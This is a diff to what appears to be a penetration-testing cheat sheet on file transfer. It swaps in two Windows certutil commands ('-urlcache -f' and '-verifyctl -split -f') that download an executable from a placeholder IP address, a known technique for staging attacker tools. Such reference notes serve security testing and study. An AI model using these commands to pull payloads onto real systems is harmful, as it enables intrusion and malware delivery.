@@ -100,8 +100,8 @@ scp from-user@10.x.x.x:/source/folder/ to-user@10.y.y.y:/dest/folder/
 
 ## Windows certutil.exe
 ```
-// Windows wget equivalent.
-certutil -urlcache -f http://10.x.x.x:port/file.ext outfile.exe
+certutil -urlcache -f http://10.x.x.x/file.exe out.exe
+certutil -verifyctl -split -f http://10.x.x.x/file.exe
 ```
 
 <br />
